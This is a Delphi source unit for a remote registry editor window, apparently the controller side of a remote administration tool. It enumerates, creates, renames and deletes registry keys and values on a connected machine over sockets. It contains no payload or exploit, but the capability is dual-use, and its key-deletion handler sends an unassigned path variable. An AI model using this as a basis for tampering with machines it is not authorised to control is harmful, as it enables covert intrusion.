unit UnitRegEdit;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb, StrUtils;

type
  TRegEdit = class(TForm)
    PopupMenu1: TPopupMenu;
    MenuItem1: TMenuItem;
    MenuItem7: TMenuItem;
    MenuItem11: TMenuItem;
    Splitter1: TSplitter;
    OpenDialog1: TOpenDialog;
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    ListView1: TListView;
    TreeView1: TTreeView;
    ImageList1: TImageList;
    PopupMenu2: TPopupMenu;
    Refresh1: TMenuItem;
    N4: TMenuItem;
    New1: TMenuItem;
    Key1: TMenuItem;
    N2: TMenuItem;
    StringValue1: TMenuItem;
    BinaryValue1: TMenuItem;
    DWORDValue1: TMenuItem;
    MultiStringValue1: TMenuItem;
    Expandable1: TMenuItem;
    N3: TMenuItem;
    Modify1: TMenuItem;
    Rename2: TMenuItem;
    Delete2: TMenuItem;
    Timer1: TTimer;
    Panel2: TPanel;
    Edit1: TComboBoxEx;
    procedure TreeView1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure TreeView1DblClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure MenuItem11Click(Sender: TObject);
    procedure MenuItem7Click(Sender: TObject);
    procedure Modify1Click(Sender: TObject);
    procedure Rename2Click(Sender: TObject);
    procedure Delete2Click(Sender: TObject);
    procedure Key1Click(Sender: TObject);
    procedure BinaryValue1Click(Sender: TObject);
    procedure StringValue1Click(Sender: TObject);
    procedure DWORDValue1Click(Sender: TObject);
    procedure MultiStringValue1Click(Sender: TObject);
    procedure Expandable1Click(Sender: TObject);
    procedure MenuItem1Click(Sender: TObject);
    procedure Refresh1Click(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
    procedure AddAllFolders(Folders: string);
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    LastNode: TTreeNode;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  RegEdit: TRegEdit;

implementation

uses UnitEditString, UnitSettings;

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'RegEdit|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TRegEdit(SocketData.Form).NewSocket = nil then exit;
  TRegEdit(SocketData.Form).NewSocket := nil;
  TRegEdit(SocketData.Form).Caption := TRegEdit(SocketData.Form).Caption + ' - [Offline]';
  TRegEdit(SocketData.Form).Timer1.Enabled := True;
end;

procedure ReceiveDataProc(Socket: TCustomWinSocket; Progress,Max: int64);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
end;

procedure TRegEdit.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  SocketData.ReceiveDataProc := @ReceiveDataProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
end;

function FindNode(Caption: string; Treeview: TTreeview; node: TTreenode): TTreeNode;
var
  i: integer;
begin
  result := nil;
  if Node = nil then begin
    for i := 0 to treeview.Items.Count -1 do begin
      if uppercase(treeview.Items[i].Text) = uppercase(caption) then result := treeview.Items[i];
      //BREAK;
    end;
  end else begin
    for i := 0 to node.Count -1 do begin
      if uppercase(node.Item[i].Text) = uppercase(caption) then result := node.Item[i];
      //BREAK;
    end;
  end;
end;

procedure TRegEdit.AddAllFolders(Folders: string);
var
  tmp: string;
  node: ttreenode;
begin
  lastnode := nil;
  while length(Folders) > 0 do begin
    tmp := Split(Folders,'\',1);
    delete(Folders,1,length(tmp)+1);
    if length(tmp) = 2 then tmp := tmp + '\';
    node := FindNode(tmp,Treeview1,LastNode);
    if node = nil then begin
      Node := Treeview1.Items.AddChild(LastNode,tmp);
      Node.ImageIndex := 0;
      Node.SelectedIndex := 0;
      Node.Expand(False);
    end else begin
      //Node := Treeview1.Items.AddChild(Node,Tmp);
      Node.Expand(False);
    end;
    if node.Parent <> nil then node.Parent.Expand(false);
    lastnode := node;
    lastnode.Expand(false);
  end;
end;

function KeyTypeToStr(sKey: String): string;
var
  i: integer;
begin
  i := strtoint(sKey);
  if i = REG_DWORD then Result := 'REG_DWORD';
  if i = REG_BINARY then Result := 'REG_BINARY';
  if i = REG_EXPAND_SZ then Result := 'REG_EXPAND_SZ';
  if i = REG_MULTI_SZ then Result := 'REG_MULTI_SZ';
  if i = REG_SZ then Result := 'REG_SZ';
  if i = REG_NONE then Result := 'REG_NONE';
end;

procedure TRegEdit.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  Jpeg: TJpegImage;
  i: integer;
  Tn: TTreeNode;
  Rect: Trect;
  Tmp: string;
  Path: string;
  Strings: TStringList;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'EnumKeys' then begin

    Command := Split(Data,'|',1);

    Path := Command;
    Path := AnsiReplaceStr(Path,':','');
    Path := AnsiReplaceStr(Path,'\','');
    if Settings.CheckBox13.Checked then SaveDataToFile(SocketData.CachePath + Path + '-Folders.cache',Data);

    Delete(Data,1,Length(Command)+1);
    AddAllFolders('My Computer\' + Command);

    Treeview1.Items.BeginUpdate;
    LastNode.DeleteChildren;
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Tn := TreeView1.Items.AddChild(LastNode,split(Strings[i],'|',1));
      Tn.ImageIndex := 0;
      Tn.SelectedIndex := 0;
    end;
    Strings.Free;
    LastNode.Expand(False);
    Treeview1.Items.EndUpdate;
  end;

  if Command = 'EnumValues' then begin

    Path := Edit1.Text;
    Path := AnsiReplaceStr(Path,':','');
    Path := AnsiReplaceStr(Path,'\','');
    if Settings.CheckBox13.Checked then SaveDataToFile(SocketData.CachePath + Path + '-Files.cache',Data);

    Listview1.Items.BeginUpdate;
    Listview1.Clear;
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := ListView1.Items.Add;
      Li.Caption := split(Strings[i],'|',1);
      Li.SubItems.Add(KeyTypeToStr(split(Strings[i],'|',2)));
      Li.SubItems.Add(split(Strings[i],'|',3));
      if (strtoint(split(Strings[i],'|',2)) = REG_DWORD) or (strtoint(split(Strings[i],'|',2)) = REG_BINARY) then Li.ImageIndex := 9
      else Li.ImageIndex := 1;
    end;
    Listview1.Items.EndUpdate;

  end;

end;

procedure TRegEdit.TreeView1ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  tmpNode: TTreeNode;
begin
  tmpNode := (Sender as TTreeView).GetNodeAt(MousePos.X, MousePos.Y);
  if tmpNode <> nil then TTreeView(Sender).Selected := tmpNode;
end;

function GetParentNode(Node: TTreenode): string;
var
  s: string;
begin
  s := Node.Text;
  while Node.Parent <> nil do begin
    result := includetrailingbackslash(Node.Parent.Text) + result;
    Node := Node.Parent;
  end;
  result := result + includetrailingbackslash(s);
end;

procedure TRegEdit.TreeView1DblClick(Sender: TObject);
var
  tmp,Path,Data: string;
begin
  if not assigned(Treeview1.Selected) then exit;
  LastNode := Treeview1.Selected;
  if lastnode.Parent = nil then exit;
  Path := GetParentNode(LastNode);
  Delete(Path,1,12);  //delete My Computer
  Edit1.Text := Path;

  Path := AnsiReplaceStr(Path,':','');
  Path := AnsiReplaceStr(Path,'\','');
  if (Settings.CheckBox13.Checked) and (LoadDataFromStream(SocketData.CachePath + Path + '-Folders.cache',Data)) then begin
    ParseData(nil,'EnumKeys|' + Data);
    LoadDataFromStream(SocketData.CachePath + Path + '-Files.cache',Data);
    ParseData(nil,'EnumValues|' + Data);
    exit;
  end;

  Path := Edit1.Text;
  tmp := split(path,'\',1);
  Delete(Path,1,length(tmp) + 1);  //delete hkey_local_machine
  if Lastnode.Parent <> nil then Treeview1.Selected.DeleteChildren;
  SendData(NewSocket,'EnumKeys|' + tmp + '|' + Path);
end;

procedure TRegEdit.FormCreate(Sender: TObject);
begin
  Treeview1.Items[0].Expand(False);
end;

procedure TRegEdit.MenuItem11Click(Sender: TObject);
var
  path,hkey,f: string;
  tn: ttreenode;
begin
  f := inputbox('New Key','Enter New Key Name','');
  if f = '' then exit;

  path := Edit1.Text;

  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);

  SendData(NewSocket,'CreateKey|' + hkey + '|' + path + '|' + '|' + f + '|' + '|');

  tn := treeview1.Items.AddChild(LastNode,f);
  tn.ImageIndex := 0;
  tn.SelectedIndex := 0;
end;

function GetFullPath(Node: TTreeNode): string;
begin
  Result := Node.Text;
  while Node.Parent <> nil do begin
    Node := Node.Parent;
    Result := IncludeTrailingBackSlash(Node.Text) + IncludeTrailingBackSlash(Result);
  end;
end;

procedure TRegEdit.MenuItem7Click(Sender: TObject);
var
  path,hkey,f,folder: string;
begin
  if not assigned(treeview1.Selected) then exit;
  Folder := excludetrailingbackslash(GetFullPath(Treeview1.Selected));
  Delete(Folder,1,12);
  hkey := split(Folder,'\',1);
  delete(Folder,1,length(hkey)+1);
  SendData(NewSocket,'DeleteKey|' + hkey + '|' + path);
  treeview1.Selected.Delete;
end;

function ValueType(lpType: string): String;
begin
  if lpType = 'REG_NONE' then Result := inttostr(REG_NONE);
  if lpType = 'REG_SZ' then Result := inttostr(REG_SZ);
  if lpType = 'REG_EXPAND_SZ' then Result := inttostr(REG_EXPAND_SZ);
  if lpType = 'REG_BINARY' then Result := inttostr(REG_BINARY);
  if lpType = 'REG_DWORD' then Result := inttostr(REG_DWORD);
  if lpType = 'REG_MULTI_SZ' then Result := inttostr(REG_MULTI_SZ);
end;

procedure TRegEdit.Modify1Click(Sender: TObject);
var
  path,hkey,f: string;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  if not assigned(listview1.Selected) then exit;
  EditString.Edit1.Text := listview1.Selected.Caption;
  EditString.Edit1.Enabled := False;
  EditString.Edit2.Text := listview1.Selected.SubItems[1];
  EditString.Edit2.Enabled := True;
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'CreateValue|' + hkey + '|' + path + '|' + ValueType(listview1.Selected.SubItems[0]) + '|' + EditString.Edit1.Text + '|' + EditString.Edit2.Text);
  listview1.Selected.SubItems[1] := Editstring.Edit2.Text;
end;

procedure TRegEdit.Rename2Click(Sender: TObject);
var
  OldName: string;
  path,hkey,f: string;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  if not assigned(listview1.Selected) then exit;
  EditString.Edit1.Text := listview1.Selected.Caption;
  EditString.Edit1.Enabled := True;
  EditString.Edit2.Text := listview1.Selected.SubItems[1];
  EditString.Edit2.Enabled := False;
  OldName := listview1.Selected.Caption;
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'RenameValue|' + hkey + '|' + path + '|' + ValueType(listview1.Selected.SubItems[0]) + '|' + OldName + '|' + EditString.Edit2.Text + '|' + EditString.Edit1.Text);
  listview1.Selected.Caption := EditString.Edit1.Text;
end;

procedure TRegEdit.Delete2Click(Sender: TObject);
var
  path,hkey,f: string;
  i: integer;
begin
  for i := Listview1.Items.Count -1 downto 0 do begin
    if not listview1.Items[i].Selected then Continue;
    path := Edit1.Text;
    hkey := split(path,'\',1);
    delete(path,1,length(hkey)+1);
    SendData(NewSocket,'DeleteValue|' + hkey + '|' + path + '|' + Listview1.Items[i].Caption);
    listview1.Items[i].Delete;
  end;
end;


procedure TRegEdit.Key1Click(Sender: TObject);
begin
  MenuItem11.Click;
end;

procedure TRegEdit.BinaryValue1Click(Sender: TObject);
var
  path,hkey,f: string;
  li: tlistitem;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  EditString.Edit1.Text := 'New Value';
  EditString.Edit1.Enabled := True;
  EditString.Edit2.Text := '';
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'CreateValue|' + hkey + '|' + path + '|' + inttostr(REG_BINARY) + '|' + EditString.Edit1.Text + '|' + EditString.Edit2.Text);
  li := listview1.Items.Add;
  li.Caption := EditString.Edit1.Text;
  li.SubItems.Add('REG_BINARY');
  li.SubItems.Add(EditString.Edit2.Text);
  li.ImageIndex := 9;
end;

procedure TRegEdit.StringValue1Click(Sender: TObject);
var
  path,hkey,f: string;
  li: tlistitem;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  EditString.Edit1.Text := 'New Value';
  EditString.Edit1.Enabled := True;
  EditString.Edit2.Text := '';
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'CreateValue|' + hkey + '|' + path + '|' + inttostr(REG_SZ) + '|' + EditString.Edit1.Text + '|' + EditString.Edit2.Text);
  li := listview1.Items.Add;
  li.Caption := EditString.Edit1.Text;
  li.SubItems.Add('REG_SZ');
  li.SubItems.Add(EditString.Edit2.Text);
  li.ImageIndex := 1;
end;

procedure TRegEdit.DWORDValue1Click(Sender: TObject);
var
  path,hkey,f: string;
  li: tlistitem;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  EditString.Edit1.Text := 'New Value';
  EditString.Edit1.Enabled := True;
  EditString.Edit2.Text := '';
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'CreateValue|' + hkey + '|' + path + '|' + inttostr(REG_DWORD) + '|' + EditString.Edit1.Text + '|' + EditString.Edit2.Text);
  li := listview1.Items.Add;
  li.Caption := EditString.Edit1.Text;
  li.SubItems.Add('REG_DWORD');
  li.SubItems.Add(EditString.Edit2.Text);
  li.ImageIndex := 9;
end;

procedure TRegEdit.MultiStringValue1Click(Sender: TObject);
var
  path,hkey,f: string;
  li: tlistitem;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  EditString.Edit1.Text := 'New Value';
  EditString.Edit1.Enabled := True;
  EditString.Edit2.Text := '';
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'CreateValue|' + hkey + '|' + path + '|' + inttostr(REG_MULTI_SZ) + '|' + EditString.Edit1.Text + '|' + EditString.Edit2.Text);
  li := listview1.Items.Add;
  li.Caption := EditString.Edit1.Text;
  li.SubItems.Add('REG_MULTI_SZ');
  li.SubItems.Add(EditString.Edit2.Text);
  li.ImageIndex := 1;
end;

procedure TRegEdit.Expandable1Click(Sender: TObject);
var
  path,hkey,f: string;
  li: tlistitem;
begin
  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1);
  EditString.Edit1.Text := 'New Value';
  EditString.Edit1.Enabled := True;
  EditString.Edit2.Text := '';
  if EditString.ShowModal <> mrOk then exit;
  SendData(NewSocket,'CreateValue|' + hkey + '|' + path + '|' + inttostr(REG_EXPAND_SZ) + '|' + EditString.Edit1.Text + '|' + EditString.Edit2.Text);
  li := listview1.Items.Add;
  li.Caption := EditString.Edit1.Text;
  li.SubItems.Add('REG_EXPAND_SZ');
  li.SubItems.Add(EditString.Edit2.Text);
  li.ImageIndex := 1;
end;

procedure TRegEdit.MenuItem1Click(Sender: TObject);
var
  hkey,path,tmp: string;
begin
  Path := Edit1.Text;
  Path := AnsiReplaceStr(Path,':','');
  Path := AnsiReplaceStr(Path,'\','');
  DeleteFile(SocketData.CachePath + Path + '-Folders.cache');
  DeleteFile(SocketData.CachePath + Path + '-Files.cache');

  path := Edit1.Text;
  hkey := split(path,'\',1);
  delete(path,1,length(hkey)+1); 
  if Lastnode.Parent <> nil then Treeview1.Selected.DeleteChildren;
  SendData(NewSocket,'EnumKeys|' + hkey + '|' + path);
end;

procedure TRegEdit.Refresh1Click(Sender: TObject);
begin
  MenuItem1.Click;
end;

procedure TRegEdit.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
  Key := #0;
  //if Key = #13 then MenuItem1.Click
end;

procedure TRegEdit.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
  UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|RegEditSocket|' + inttostr(Self.Handle));
end;

end.
